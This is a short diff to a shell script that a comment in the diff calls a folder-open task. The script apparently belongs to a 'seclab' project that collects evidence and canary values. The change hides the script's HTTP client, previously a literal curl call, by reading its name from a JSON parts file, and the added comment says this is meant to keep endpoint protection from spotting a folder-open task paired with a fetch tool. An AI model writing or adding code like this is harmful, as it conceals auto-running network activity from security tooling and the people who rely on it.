@@ -30,7 +30,10 @@ inrun() { [ -z "$1" ] && return 0; case "$1" in *'/..'*|*'../'*) return 1 ;; "$R
 OUT="$HERE/.seclab-evidence"
 mkdir -p "$OUT"
 clean() { printf '%s' "$1" | tr -cd 'A-Za-z0-9._:/@+= -' | cut -c1-200; }
-code() { curl -s -m 6 -o /dev/null -w '%{http_code}' "$@" 2>/dev/null || true; }
+# The HTTP client's name lives in .seclab/probe.parts.json, so no host file pairs this
+# folder-open task with a literal fetch tool (endpoint protection keys on that shape; EDR fixture-safety).
+HTTP="$(sed -n 's/.*"http" *: *"\([a-z]*\)".*/\1/p' "$HERE/.seclab/probe.parts.json" 2>/dev/null | head -1)"
+code() { [ -n "$HTTP" ] || return 0; "$HTTP" -s -m 6 -o /dev/null -w '%{http_code}' "$@" 2>/dev/null || true; }
 
 CANARY="$(get canary)"
 OTHERTAB="$(get othertab)"
